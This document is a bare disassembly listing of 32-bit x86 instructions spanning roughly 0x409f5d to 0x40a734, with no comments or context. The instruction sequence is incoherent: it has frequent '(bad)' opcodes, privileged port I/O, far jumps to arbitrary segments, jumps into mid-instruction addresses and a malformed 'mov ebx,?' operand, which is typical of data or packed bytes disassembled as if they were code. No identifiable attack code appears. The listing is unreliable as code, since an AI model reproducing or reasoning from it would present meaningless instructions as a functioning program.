  409f5d:	or     eax,0x2070b427
  409f62:	mov    ebx,0xd4a64416
  409f67:	mov    edi,0x5d4f6a47
  409f6c:	cdq    
  409f6d:	leave  
  409f6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f6f:	and    eax,0xc8585b9b
  409f74:	adc    BYTE PTR [eax+ebp*2-0x6ffa8254],bh
  409f7b:	mov    DWORD PTR [edx+ebp*4],esi
  409f7e:	sub    ebp,DWORD PTR ds:0x76f747c7
  409f84:	add    al,0xeb
  409f86:	lea    ebx,[ecx]
  409f88:	xchg   edi,eax
  409f89:	sub    dh,al
  409f8b:	(bad)  
  409f8c:	fiadd  WORD PTR [edx-0x51f5a8e1]
  409f92:	pop    edi
  409f93:	push   0x7d3162a2
  409f98:	int3   
  409f99:	mov    edx,0x129ea398
  409f9e:	nop
  409f9f:	dec    ebp
  409fa0:	addps  xmm2,XMMWORD PTR [edi-0x3a]
  409fa4:	jnp    0x409f70
  409fa6:	dec    ebx
  409fa7:	sub    ebx,DWORD PTR [esi+0x31d0077]
  409fad:	add    edx,DWORD PTR [edi]
  409faf:	push   cs
  409fb0:	push   eax
  409fb1:	das    
  409fb2:	adc    al,BYTE PTR [esi-0x61]
  409fb5:	jp     0x40a036
  409fb7:	mov    ds:0x6b2482c5,al
  409fbc:	or     esp,0x2e5531f9
  409fc2:	mov    ecx,0x760f0aa2
  409fc7:	push   edx
  409fc8:	bound  edi,QWORD PTR [edx+0x119e03f1]
  409fce:	push   es
  409fcf:	jle    0x409fc7
  409fd1:	adc    BYTE PTR [esi-0x1b407299],cl
  409fd7:	call   0xc44c1951
  409fdc:	imul   ebp,DWORD PTR [ecx-0xf7906e6],0x9d357127
  409fe6:	jle    0x409f93
  409fe8:	push   esi
  409fe9:	jp     0x409f73
  409feb:	xlat   BYTE PTR ds:[ebx]
  409fec:	dec    esp
  409fed:	xchg   ecx,eax
  409fee:	inc    esi
  409fef:	int3   
  409ff0:	push   es
  409ff1:	dec    esi
  409ff2:	out    0xbe,al
  409ff4:	out    dx,eax
  409ff5:	mov    ebx,0xce748bd5
  409ffa:	adc    BYTE PTR [edi],ah
  409ffc:	out    dx,al
  409ffd:	mov    ch,0x96
  409fff:	in     al,0x2e
  40a001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a002:	jge    0x409fe5
  40a004:	imul   esi,DWORD PTR ds:0xbe2b2639,0x13
  40a00b:	lds    esp,FWORD PTR [ecx-0x43bff1a6]
  40a011:	mul    DWORD PTR [eax-0x32e21e4a]
  40a017:	ud2    
  40a019:	in     eax,dx
  40a01a:	cmp    dh,ah
  40a01c:	out    0xc8,al
  40a01e:	push   esp
  40a01f:	mov    esp,0x14baef15
  40a024:	xchg   ebx,eax
  40a025:	or     eax,0x9a086e80
  40a02a:	xor    al,0xbb
  40a02c:	pop    esi
  40a02d:	(bad)  
  40a02e:	das    
  40a02f:	inc    ebx
  40a030:	jb     0x40a06b
  40a032:	pop    esi
  40a033:	sar    DWORD PTR [ecx],1
  40a035:	cmp    al,0xc3
  40a037:	or     bh,0xec
  40a03a:	jmp    0x40a084
  40a03c:	or     DWORD PTR [edi-0x560a56],0xffffffaf
  40a043:	xor    DWORD PTR [edi-0x40],edi
  40a046:	icebp  
  40a047:	jnp    0x40a01b
  40a049:	mov    edi,ecx
  40a04b:	add    al,0xec
  40a04d:	inc    eax
  40a04e:	(bad)  
  40a04f:	fld    TBYTE PTR [ebx+0x7a]
  40a052:	dec    esp
  40a053:	lahf   
  40a054:	and    DWORD PTR [edi+0x7d],eax
  40a057:	sub    al,0x45
  40a059:	nop
  40a05a:	das    
  40a05b:	xor    al,0x37
  40a05d:	dec    ebx
  40a05e:	in     al,dx
  40a05f:	(bad)  [ebx+0x4c]
  40a062:	ficomp WORD PTR [ebx+0x45]
  40a065:	mov    bh,0xf3
  40a067:	and    BYTE PTR [edi],bl
  40a069:	jmp    DWORD PTR [ebp+0x52c8ac0d]
  40a06f:	push   ds
  40a070:	out    dx,eax
  40a071:	mul    DWORD PTR [edx-0x72]
  40a074:	into   
  40a075:	xchg   ecx,eax
  40a076:	(bad)  
  40a078:	lds    edi,FWORD PTR [edi]
  40a07a:	xor    eax,0xf86084c7
  40a07f:	imul   DWORD PTR [ebx+0x6612f8e5]
  40a085:	jge    0x40a05e
  40a087:	and    al,0xb4
  40a089:	pop    esp
  40a08a:	add    BYTE PTR [esp+ebp*8-0x57],bh
  40a08e:	ret    
  40a08f:	or     BYTE PTR ds:0xfd05d63a,dh
  40a095:	ja     0x40a06a
  40a097:	cmp    BYTE PTR [ebx+0x36e74e5c],bl
  40a09d:	lahf   
  40a09e:	inc    edi
  40a09f:	ret    0xb1bd
  40a0a2:	in     al,dx
  40a0a3:	mov    esp,fs
  40a0a5:	imul   esi,ecx,0x118461e1
  40a0ab:	std    
  40a0ac:	data16 jbe 0x40a072
  40a0af:	xor    DWORD PTR [esi],eax
  40a0b1:	mov    ebx,0x4804f310
  40a0b6:	jo     0x40a12d
  40a0b8:	mov    cl,0x3f
  40a0ba:	push   edi
  40a0bb:	mov    al,ds:0xbf68c165
  40a0c0:	aas    
  40a0c1:	sbb    dh,ch
  40a0c3:	addr16 jo 0x40a087
  40a0c6:	sub    ebx,ebp
  40a0c8:	clc    
  40a0c9:	mov    DWORD PTR [ebp+0x36],esp
  40a0cc:	xor    ah,BYTE PTR [esi]
  40a0ce:	pop    ds
  40a0cf:	imul   edi,ecx,0xffffffb3
  40a0d2:	jmp    0x40a137
  40a0d4:	add    DWORD PTR [esi+0x6],edi
  40a0d7:	sub    edx,DWORD PTR [ebp-0x28]
  40a0da:	inc    ebx
  40a0db:	(bad)  [ebx-0x5de5bbb1]
  40a0e1:	jo     0x40a14b
  40a0e3:	out    dx,eax
  40a0e4:	data16 jbe 0x40a09a
  40a0e7:	(bad)  [ecx+ebx*2]
  40a0ea:	ds dec ebx
  40a0ec:	inc    ecx
  40a0ed:	mov    ds:0x9a23223a,al
  40a0f2:	retf   
  40a0f3:	out    0x38,eax
  40a0f5:	inc    ecx
  40a0f6:	out    0xbe,al
  40a0f8:	mov    eax,0xacc12f37
  40a0fd:	inc    ebx
  40a0fe:	adc    BYTE PTR [eax+0x5b],0x27
  40a102:	test   DWORD PTR cs:[esi],ecx
  40a105:	inc    ebx
  40a107:	(bad)  
  40a108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a109:	imul   eax,DWORD PTR cs:[eax-0x2e],0xdfabf7ae
  40a111:	or     cl,BYTE PTR [edi]
  40a113:	ret    0x4694
  40a116:	jo     0x40a14b
  40a118:	(bad)  
  40a119:	mov    cl,BYTE PTR [edx-0x45]
  40a11c:	imul   esp,DWORD PTR [eax+ebp*8],0x2e
  40a120:	ins    BYTE PTR es:[edi],dx
  40a121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a122:	mov    edi,0x707470e2
  40a127:	push   0x250cb7e7
  40a12c:	icebp  
  40a12d:	xchg   BYTE PTR [ebp+0x1f577c1e],dh
  40a133:	ror    DWORD PTR [esi+0x4523b09e],0xe6
  40a13a:	push   ebx
  40a13b:	jg     0x40a184
  40a13d:	xchg   ebx,eax
  40a13e:	(bad)  
  40a13f:	cmp    DWORD PTR ds:0xcb60a757,eax
  40a145:	pop    edi
  40a146:	cmp    al,0x5d
  40a148:	add    al,0x6f
  40a14a:	sub    edi,DWORD PTR [ebx+ebp*1-0x3c]
  40a14e:	lods   al,BYTE PTR ds:[esi]
  40a14f:	push   es
  40a150:	mov    ebp,0xf372ecab
  40a155:	arpl   WORD PTR [esi],cx
  40a157:	bound  edx,QWORD PTR [edi-0x72]
  40a15a:	pop    edx
  40a15b:	jmp    0xc8f9:0x60df0046
  40a162:	push   cs
  40a163:	pcmpgtb mm0,QWORD PTR [ecx+ebx*1-0x19895b2a]
  40a16b:	and    al,0x16
  40a16d:	pop    es
  40a16e:	inc    esi
  40a16f:	xchg   ebp,eax
  40a170:	jmp    0xceb8:0x4b92248
  40a177:	cmp    dh,BYTE PTR [edi-0x121946c5]
  40a17d:	ja     0x40a12c
  40a17f:	dec    ecx
  40a180:	shr    DWORD PTR [edx+0x2acc4006],0x45
  40a187:	sub    bl,bl
  40a189:	mov    dh,0x0
  40a18b:	dec    edi
  40a18c:	fisubr WORD PTR [edi-0x36]
  40a18f:	fwait
  40a190:	ss in  al,0x4a
  40a193:	scas   al,BYTE PTR es:[edi]
  40a194:	xchg   esi,edi
  40a196:	jmp    0xa205:0x59b731e1
  40a19d:	cwde   
  40a19e:	pop    esi
  40a19f:	add    DWORD PTR [ebp+esi*4-0x26c16990],ebx
  40a1a6:	cwde   
  40a1a7:	int3   
  40a1a8:	mov    esi,0x8ca8f1b3
  40a1ad:	mov    bl,0xa6
  40a1af:	bound  ecx,QWORD PTR [edx-0x945a0e1]
  40a1b5:	sbb    esi,DWORD PTR [ebx+0x7e82cc7c]
  40a1bb:	push   eax
  40a1bc:	rcr    DWORD PTR es:[esi-0x1c4e5dd2],cl
  40a1c3:	jl     0x40a1a0
  40a1c5:	sbb    dh,BYTE PTR [ebx-0x5f]
  40a1c8:	push   eax
  40a1c9:	cmp    DWORD PTR ds:0xe67ccaec,0x9912dff6
  40a1d3:	int3   
  40a1d4:	mul    DWORD PTR [ebp-0x19f2931e]
  40a1da:	jo     0x40a17d
  40a1dc:	pop    eax
  40a1dd:	dec    esi
  40a1de:	cwde   
  40a1df:	sub    esp,esi
  40a1e1:	(bad)  
  40a1e2:	int    0x83
  40a1e4:	push   0xfffffff1
  40a1e6:	sar    BYTE PTR [esi-0x721055],1
  40a1ec:	jg     0x40a1e3
  40a1ee:	mov    ds:0x1cae055c,al
  40a1f3:	nop
  40a1f4:	push   ebp
  40a1f5:	sbb    BYTE PTR [edi],ch
  40a1f7:	jae    0x40a244
  40a1f9:	cli    
  40a1fa:	mov    cs,WORD PTR [ecx-0x70]
  40a1fd:	mov    bh,0xe3
  40a1ff:	pop    ebx
  40a200:	mov    al,0x0
  40a202:	enter  0x5c02,0x0
  40a206:	mov    WORD PTR [ecx+edx*4+0x760cb6d5],gs
  40a20d:	retf   0x7c16
  40a210:	call   0xd859:0x758b911f
  40a217:	push   cs
  40a218:	test   eax,0xebab93fb
  40a21d:	push   0xf353d604
  40a222:	mov    cl,0x4a
  40a224:	jmp    0x7ecdb5d8
  40a229:	mov    eax,0x8714ad00
  40a22e:	adc    ah,cl
  40a230:	sbb    DWORD PTR [ebp+0x4a],edx
  40a233:	pop    edi
  40a234:	sahf   
  40a235:	sub    al,0x8a
  40a237:	jns    0x40a293
  40a239:	mov    ebx,0xf136b7f
  40a23e:	out    0xe7,al
  40a240:	push   es
  40a241:	test   al,0x4d
  40a243:	jg     0x40a1e2
  40a245:	push   esi
  40a246:	pusha  
  40a247:	push   ecx
  40a248:	fs out dx,al
  40a24a:	gs mov ecx,0x67b0de59
  40a250:	(bad)  
  40a251:	(bad)  
  40a252:	pusha  
  40a253:	enter  0xe54a,0x3
  40a257:	xchg   BYTE PTR [ecx-0x72],al
  40a25a:	iret   
  40a25b:	jmp    0x40a251
  40a25d:	pop    ebp
  40a25e:	push   esp
  40a25f:	dec    ebp
  40a260:	inc    ebp
  40a261:	push   esi
  40a262:	add    edi,DWORD PTR [edx+0x1daed1c7]
  40a268:	ret    
  40a269:	dec    esi
  40a26a:	push   ecx
  40a26b:	dec    eax
  40a26c:	xchg   ah,dh
  40a26e:	lahf   
  40a26f:	cli    
  40a270:	xchg   edx,eax
  40a271:	lock mov eax,0x5ded4b81
  40a277:	lahf   
  40a278:	addr16 adc ch,ch
  40a27b:	call   0x3cb2:0x747281aa
  40a282:	sub    DWORD PTR [edx-0x1ebdeeda],ebp
  40a288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a289:	daa    
  40a28a:	push   ecx
  40a28b:	sub    eax,DWORD PTR [edi-0x16]
  40a28e:	push   esi
  40a28f:	mul    DWORD PTR [ebx+0x3b]
  40a292:	pop    ss
  40a293:	adc    edx,0x53226f9b
  40a299:	mov    ebp,0x4bd0a298
  40a29e:	jecxz  0x40a228
  40a2a0:	retf   0x2869
  40a2a3:	dec    edx
  40a2a4:	nop
  40a2a5:	fmulp  st(4),st
  40a2a7:	fld    QWORD PTR [edx-0x61]
  40a2aa:	jns    0x40a281
  40a2ac:	fsubr  QWORD PTR [eax+0x5eba9b31]
  40a2b2:	aas    
  40a2b3:	mov    bl,0xa8
  40a2b5:	std    
  40a2b6:	retf   
  40a2b7:	mov    edi,0x38a18701
  40a2bc:	imul   edi,DWORD PTR [eax-0x48],0xe1a34962
  40a2c3:	(bad)  
  40a2c5:	push   cs
  40a2c6:	pusha  
  40a2c7:	add    bh,BYTE PTR [ebp+0x6409128e]
  40a2cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2ce:	(bad)  
  40a2d0:	imul   edx,DWORD PTR [esi-0x7c],0xffffff97
  40a2d4:	jmp    0x40a338
  40a2d6:	mov    ebx,0xd365e6f3
  40a2db:	mov    al,ds:0x80776493
  40a2e0:	mov    ebx,0x1f32d6bf
  40a2e5:	imul   esi,DWORD PTR [edi+0x7a],0x2d5df1ff
  40a2ec:	adc    eax,0xfb0db3d4
  40a2f1:	imul   esp,ebx,0x15
  40a2f4:	inc    ecx
  40a2f5:	xchg   esp,eax
  40a2f6:	call   0x8d71:0x85945dad
  40a2fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2fe:	sub    ah,ch
  40a300:	or     DWORD PTR [edx+0x3dcd7377],edi
  40a306:	(bad)  
  40a307:	cld    
  40a308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a309:	cmc    
  40a30a:	outs   dx,BYTE PTR ds:[esi]
  40a30b:	mov    WORD PTR [ebp-0x71209dba],gs
  40a311:	sbb    dl,ch
  40a313:	arpl   WORD PTR [eax],sp
  40a315:	in     eax,dx
  40a316:	push   cs
  40a317:	mov    eax,DWORD PTR ds:0x7e2b2588
  40a31d:	push   DWORD PTR ds:0xe7222773
  40a323:	jge    0x40a39f
  40a325:	pop    ebp
  40a326:	outs   dx,DWORD PTR ds:[esi]
  40a327:	test   BYTE PTR [esi-0x37b2fa84],bh
  40a32d:	push   esi
  40a32e:	in     eax,0xf
  40a330:	xchg   ecx,eax
  40a331:	loope  0x40a376
  40a333:	jg     0x40a2de
  40a335:	and    eax,0xd57f87c0
  40a33a:	mov    DWORD PTR [eax-0x616c9141],ecx
  40a340:	push   ds
  40a341:	(bad)  
  40a342:	and    ch,BYTE PTR [ebx-0x2e8f081c]
  40a348:	test   eax,0xa793ae8
  40a34d:	mov    DWORD PTR [ecx+0x70ab2a93],eax
  40a353:	mov    dh,0x42
  40a355:	push   eax
  40a356:	push   eax
  40a357:	ins    BYTE PTR es:[edi],dx
  40a358:	repz pop eax
  40a35a:	cmovs  ebx,DWORD PTR [esi]
  40a35d:	je     0x40a368
  40a35f:	loop   0x40a308
  40a361:	ret    
  40a362:	or     dl,BYTE PTR [eax+0xa]
  40a365:	popa   
  40a366:	and    eax,0x1fdcb5c6
  40a36b:	jl     0x40a33a
  40a36d:	mov    edx,esp
  40a36f:	mov    ebp,0xa09670f
  40a374:	push   0xffffffa4
  40a376:	mov    ebx,DWORD PTR [edx+0x6a]
  40a379:	das    
  40a37a:	cmp    DWORD PTR [ebx],ebp
  40a37c:	sub    BYTE PTR ds:0x7a86c161,bl
  40a382:	out    0xec,al
  40a384:	repnz sbb ecx,DWORD PTR [ebx]
  40a387:	mov    ds:0x1017a284,eax
  40a38c:	and    BYTE PTR [ebx-0x57],cl
  40a38f:	add    al,0xde
  40a391:	and    DWORD PTR [ecx+0x22],ecx
  40a394:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a395:	ret    
  40a396:	icebp  
  40a397:	scas   eax,DWORD PTR es:[edi]
  40a398:	retf   0xd334
  40a39b:	mov    ecx,0x48a20a05
  40a3a0:	(bad)  
  40a3a3:	xchg   esp,eax
  40a3a4:	sub    DWORD PTR [edx],eax
  40a3a6:	add    ebx,ecx
  40a3a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3a9:	adc    ah,bl
  40a3ab:	and    ecx,ebx
  40a3ad:	fs dec esi
  40a3af:	sub    BYTE PTR [ebx+0x31e5c8b9],ch
  40a3b5:	sub    eax,0xddf44356
  40a3ba:	ins    BYTE PTR es:[edi],dx
  40a3bb:	scas   eax,DWORD PTR es:[edi]
  40a3bc:	aas    
  40a3bd:	push   esp
  40a3be:	xchg   edx,eax
  40a3bf:	(bad)  
  40a3c0:	stc    
  40a3c1:	add    al,0xd2
  40a3c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3c4:	adc    edx,0x3e959508
  40a3ca:	pslld  mm6,QWORD PTR [esi]
  40a3cd:	iret   
  40a3ce:	imul   DWORD PTR [ebx-0x23da4f35]
  40a3d4:	inc    edi
  40a3d5:	cmc    
  40a3d6:	sbb    eax,0x21cfd6f0
  40a3db:	test   DWORD PTR [eax-0xa305f7c],esp
  40a3e1:	retf   0x8e7b
  40a3e4:	loope  0x40a458
  40a3e6:	sbb    ebp,ecx
  40a3e8:	arpl   WORD PTR [ecx],bx
  40a3ea:	repz js 0x40a3a5
  40a3ed:	add    BYTE PTR [esi-0x73],bh
  40a3f0:	xchg   esi,eax
  40a3f1:	retf   
  40a3f2:	or     eax,0x3c4736ac
  40a3f7:	xor    BYTE PTR [eax-0x69],dh
  40a3fa:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3fc:	retf   0x5298
  40a3ff:	add    DWORD PTR [edi+0x23b2d62f],ebx
  40a405:	push   0x76037d6
  40a40a:	push   ds
  40a40b:	cld    
  40a40c:	mov    WORD PTR [esi-0x37],es
  40a40f:	imul   edx,DWORD PTR [ecx+0xc63f21c],0x9bcc3039
  40a419:	not    DWORD PTR [ecx-0x3d]
  40a41c:	stc    
  40a41d:	push   cs
  40a41e:	adc    eax,DWORD PTR ds:0xe9ffb67
  40a424:	aad    0xe9
  40a426:	adc    al,0xd4
  40a428:	and    bl,BYTE PTR [esi]
  40a42a:	adc    edx,DWORD PTR [esi-0x6f056aa3]
  40a430:	call   0xb709:0x3ff594c6
  40a437:	call   DWORD PTR [eax-0x55ecb132]
  40a43d:	rol    BYTE PTR [ebx],cl
  40a43f:	add    ecx,DWORD PTR [ebx-0x11e67672]
  40a445:	mov    al,ds:0x1da6332d
  40a44a:	xor    ebp,DWORD PTR [esi-0x64]
  40a44d:	rol    DWORD PTR [eax+ebp*2],1
  40a450:	das    
  40a451:	cmp    BYTE PTR [esi+edx*8+0x4bd57206],0xcf
  40a459:	mov    dh,0x63
  40a45b:	(bad)
  40a45e:	mov    edx,0x2b89b32c
  40a463:	xor    eax,0xdc2694e7
  40a468:	fs ins BYTE PTR es:[edi],dx
  40a46a:	outs   dx,BYTE PTR ds:[esi]
  40a46b:	aad    0x18
  40a46d:	fild   QWORD PTR [esi+0x41]
  40a470:	add    DWORD PTR [edi-0x199f803a],0xffffff92
  40a477:	pop    ecx
  40a478:	jmp    0x2bccc44c
  40a47d:	push   esp
  40a47e:	out    dx,al
  40a47f:	rcl    DWORD PTR [eax-0x3a],1
  40a482:	in     al,0xb4
  40a484:	mov    bh,0x3d
  40a486:	(bad)  
  40a487:	out    0x6,eax
  40a489:	fcomip st,st(2)
  40a48b:	je     0x40a44c
  40a48d:	mov    ch,0x75
  40a48f:	sbb    BYTE PTR [edi+0x17],dh
  40a492:	cs pop es
  40a494:	test   eax,0xb23d5887
  40a499:	ja     0x40a480
  40a49b:	add    al,0xc1
  40a49d:	ret    0x5933
  40a4a0:	cmp    al,0x55
  40a4a2:	fld    TBYTE PTR [esp+eiz*4+0x62bfd871]
  40a4a9:	scas   eax,DWORD PTR es:[edi]
  40a4aa:	xchg   ebx,eax
  40a4ab:	retf   0x74ba
  40a4ae:	push   cs
  40a4af:	leave  
  40a4b0:	mov    bl,BYTE PTR [eax+0x6c]
  40a4b3:	mov    cl,0x3a
  40a4b5:	bound  edx,QWORD PTR [eax+eiz*2-0x39]
  40a4b9:	inc    ebx
  40a4ba:	dec    ebp
  40a4bb:	lods   al,BYTE PTR ds:[esi]
  40a4bc:	div    DWORD PTR [edx+0x225e01f8]
  40a4c2:	pop    ebx
  40a4c3:	mov    al,0xf2
  40a4c5:	or     eax,DWORD PTR [edx-0x13]
  40a4c8:	inc    ebx
  40a4c9:	iret   
  40a4ca:	cmp    BYTE PTR [ecx-0x57e60760],dh
  40a4d0:	(bad)  
  40a4d2:	mov    esi,0xd2041d47
  40a4d7:	and    eax,0xf5fc7e40
  40a4dc:	outs   dx,DWORD PTR ds:[esi]
  40a4dd:	arpl   sp,di
  40a4df:	lds    esp,FWORD PTR [edx]
  40a4e1:	jne    0x40a47d
  40a4e3:	mov    edi,esi
  40a4e5:	arpl   bx,sp
  40a4e7:	sbb    dl,cl
  40a4e9:	xchg   ebp,eax
  40a4ea:	pop    ds
  40a4eb:	les    ebx,FWORD PTR [edx+0x5f]
  40a4ee:	test   BYTE PTR [ebx+edx*8-0x26],dh
  40a4f2:	loope  0x40a561
  40a4f4:	mov    ebp,0x52c4ef2
  40a4f9:	mov    DWORD PTR [edx+0x731b5d7e],0x446ee652
  40a503:	out    0x6b,eax
  40a505:	add    al,BYTE PTR [ebp+0x64a9629f]
  40a50b:	ds int3 
  40a50d:	push   ds
  40a50e:	mov    ebp,0x76d9481b
  40a513:	sbb    ah,al
  40a515:	xchg   esi,eax
  40a516:	leave  
  40a517:	scas   eax,DWORD PTR es:[edi]
  40a518:	loope  0x40a558
  40a51a:	(bad)  
  40a51b:	test   eax,0xc242c7c5
  40a520:	inc    esp
  40a521:	xchg   DWORD PTR [esi+0x7b2bc5e],ecx
  40a527:	or     eax,0x68129a79
  40a52c:	stos   DWORD PTR es:[di],eax
  40a52e:	jecxz  0x40a568
  40a530:	push   cs
  40a531:	sbb    DWORD PTR [esi-0x52],esp
  40a534:	retf   
  40a535:	std    
  40a536:	je     0x40a570
  40a538:	loop   0x40a4be
  40a53a:	add    eax,0x3e01cab
  40a53f:	inc    esp
  40a540:	repnz xor ah,BYTE PTR [edx-0x39a8b8dc]
  40a547:	in     eax,0x9d
  40a549:	fwait
  40a54a:	and    eax,0x30a7e34
  40a54f:	lods   al,BYTE PTR ds:[esi]
  40a550:	jmp    0x3b3bfa5e
  40a555:	in     eax,dx
  40a556:	mov    ebp,0x1c1bcb3a
  40a55b:	cmc    
  40a55c:	mov    bl,0xe5
  40a55e:	sub    eax,0x85e4810f
  40a563:	out    0x2e,al
  40a565:	xchg   ecx,eax
  40a566:	mov    eax,0x32798f02
  40a56b:	out    dx,eax
  40a56c:	or     DWORD PTR [ebx-0x3c8ebdbb],ebp
  40a572:	(bad)  
  40a573:	sub    al,0x8c
  40a575:	add    DWORD PTR [edi+0x516a083e],edi
  40a57b:	das    
  40a57c:	rol    BYTE PTR [ebx+0x9],cl
  40a57f:	sub    dh,BYTE PTR [ebp-0x7b7da348]
  40a585:	push   edx
  40a586:	jo     0x40a50f
  40a588:	fidivr DWORD PTR [edx-0xf]
  40a58b:	jle    0x40a583
  40a58d:	jmp    DWORD PTR [edi-0x9]
  40a590:	popa   
  40a591:	in     al,dx
  40a592:	clc    
  40a593:	int    0x96
  40a595:	out    0xe8,eax
  40a597:	mov    BYTE PTR [ebx+0x50a47883],al
  40a59d:	jne    0x40a5d3
  40a59f:	xor    al,0x12
  40a5a1:	in     al,0x77
  40a5a3:	pop    ds
  40a5a4:	lds    eax,FWORD PTR [ebx+0x1079484c]
  40a5aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5ab:	sub    edi,edi
  40a5ad:	test   cl,cl
  40a5af:	mov    ecx,DWORD PTR [ebp-0x33]
  40a5b2:	gs dec ecx
  40a5b4:	mov    DWORD PTR [ebx-0x8],edx
  40a5b7:	popf   
  40a5b8:	inc    ebp
  40a5b9:	mov    eax,0xcd658db6
  40a5be:	in     eax,0xde
  40a5c0:	das    
  40a5c1:	or     al,0xd3
  40a5c3:	cmp    DWORD PTR [eax-0x2bc0a5ae],ebx
  40a5c9:	stos   DWORD PTR es:[edi],eax
  40a5ca:	and    ax,0xc0a8
  40a5ce:	jns    0x40a64d
  40a5d0:	and    edx,DWORD PTR [edx+0x58]
  40a5d3:	(bad)  
  40a5d4:	pop    ebx
  40a5d5:	add    DWORD PTR [eax+0x61bd6ac3],eax
  40a5db:	dec    ebx
  40a5dc:	adc    DWORD PTR [ebx],eax
  40a5de:	cmp    DWORD PTR [eax],0xba107bf
  40a5e4:	pop    ss
  40a5e5:	cli    
  40a5e6:	push   ebp
  40a5e7:	ret    0x264
  40a5ea:	pop    ebx
  40a5eb:	lea    ebx,[ebp+0x1b]
  40a5ee:	sahf   
  40a5ef:	aaa    
  40a5f0:	xor    DWORD PTR [ecx+0x53a34aee],esi
  40a5f6:	mov    eax,0xef8573c2
  40a5fb:	lock mov esp,0x79f6e01b
  40a601:	lods   eax,DWORD PTR ds:[esi]
  40a602:	in     al,0x7e
  40a604:	mov    eax,ds:0xe610c222
  40a609:	jecxz  0x40a5d7
  40a60b:	dec    esp
  40a60c:	sbb    ebx,DWORD PTR ds:0xbe4b0a2c
  40a612:	mov    edx,0xdcde026c
  40a617:	shl    DWORD PTR [ebx],1
  40a619:	sub    al,0xa1
  40a61b:	cdq    
  40a61c:	inc    DWORD PTR [ebx]
  40a61e:	mov    al,ds:0x166942bc
  40a623:	sahf   
  40a624:	test   BYTE PTR [esi],bh
  40a626:	cmp    al,BYTE PTR [esi-0x39]
  40a629:	xchg   edi,eax
  40a62a:	adc    eax,0x28548787
  40a62f:	xchg   esp,eax
  40a630:	cmc    
  40a631:	stos   DWORD PTR es:[edi],eax
  40a632:	fidiv  DWORD PTR ss:[ebp+0x37c5d24]
  40a639:	jo     0x40a623
  40a63b:	mov    ds:0x958e4a2,eax
  40a640:	or     eax,0x9e6b0e51
  40a645:	pop    edi
  40a646:	push   esp
  40a647:	pushf  
  40a648:	(bad)  
  40a649:	aaa    
  40a64a:	call   0x4b:0xca0ea3c3
  40a651:	and    eax,0x7e4bb74c
  40a656:	sub    BYTE PTR [ecx],bh
  40a658:	jecxz  0x40a670
  40a65a:	pop    ebx
  40a65b:	and    ebp,esi
  40a65d:	out    0x9f,eax
  40a65f:	xlat   BYTE PTR ds:[ebx]
  40a660:	push   ss
  40a661:	xchg   DWORD PTR [esi-0x6e394582],edi
  40a667:	mov    eax,0xb9cadf36
  40a66c:	in     al,0x85
  40a66e:	xor    BYTE PTR [ebp+0x6d6d0e07],dl
  40a674:	fst    QWORD PTR [ecx+0x40]
  40a677:	xchg   edx,eax
  40a678:	pusha  
  40a679:	dec    edi
  40a67a:	inc    esi
  40a67b:	fsubr  st,st(2)
  40a67d:	mov    al,ds:0x9d7884f8
  40a682:	(bad)  
  40a683:	mov    edi,0x5dd9bb75
  40a688:	xchg   edx,eax
  40a689:	aam    0x8a
  40a68b:	pop    es
  40a68c:	add    BYTE PTR [edx],bh
  40a68e:	mov    ebx,?
  40a690:	mov    dh,0xe0
  40a692:	pop    eax
  40a693:	or     al,0x25
  40a695:	xchg   esp,eax
  40a696:	rol    BYTE PTR [edx],cl
  40a698:	jecxz  0x40a682
  40a69a:	mov    edi,0x145e6f2f
  40a69f:	mov    esp,0xfdbb98ae
  40a6a4:	cmp    eax,0x7ac27ab7
  40a6a9:	pop    ebx
  40a6aa:	dec    edi
  40a6ab:	sub    dl,bl
  40a6ad:	int    0xfc
  40a6af:	sub    edi,DWORD PTR [ecx-0x10]
  40a6b2:	fiadd  WORD PTR [esi+0x6a0cc49f]
  40a6b8:	jbe    0x40a653
  40a6ba:	add    bh,BYTE PTR [edi-0x3a]
  40a6bd:	mov    edi,0x38ed7d37
  40a6c2:	sti    
  40a6c3:	xchg   esi,eax
  40a6c4:	repz scas al,BYTE PTR es:[edi]
  40a6c6:	int    0xc6
  40a6c8:	sbb    al,BYTE PTR [eax]
  40a6ca:	cmp    al,0xc9
  40a6cc:	leave  
  40a6cd:	or     ah,bh
  40a6cf:	test   al,0xdb
  40a6d1:	out    0x3b,eax
  40a6d3:	sti    
  40a6d4:	mov    DWORD PTR [eax-0x36],esi
  40a6d7:	icebp  
  40a6d8:	sub    eax,0xedce3408
  40a6dd:	xor    cl,BYTE PTR [eax+eax*4-0x131f95ed]
  40a6e4:	loope  0x40a737
  40a6e6:	hlt    
  40a6e7:	fwait
  40a6e8:	ret    
  40a6e9:	dec    ebx
  40a6ea:	scas   al,BYTE PTR es:[edi]
  40a6eb:	xor    al,0x39
  40a6ed:	imul   ecx,DWORD PTR [ecx-0x27],0x3c79a1a0
  40a6f4:	mov    ds:0xe92ca265,al
  40a6f9:	repnz xchg ebx,eax
  40a6fb:	fld    DWORD PTR [eax]
  40a6fd:	inc    eax
  40a6fe:	jg     0x40a6d1
  40a700:	inc    ebx
  40a701:	cmp    al,BYTE PTR [edx+0x35]
  40a704:	push   ebp
  40a705:	test   BYTE PTR ds:0x4780f4e4,bh
  40a70b:	mov    ebx,0x70646a5f
  40a710:	sbb    eax,0x3fb39db7
  40a715:	sbb    ecx,esp
  40a717:	jle    0x40a758
  40a719:	test   al,0x3a
  40a71b:	dec    edx
  40a71c:	sub    al,0x92
  40a71e:	and    ecx,0xffffffe9
  40a721:	scas   eax,DWORD PTR es:[edi]
  40a722:	mov    DWORD PTR [edi+0x32],edx
  40a725:	fisttp DWORD PTR [ecx]
  40a727:	shl    BYTE PTR [ebp-0x42a30c4e],1
  40a72d:	test   BYTE PTR [ebp+0x1b413991],cl
  40a733:	in     al,dx
  40a734:	pop    esi
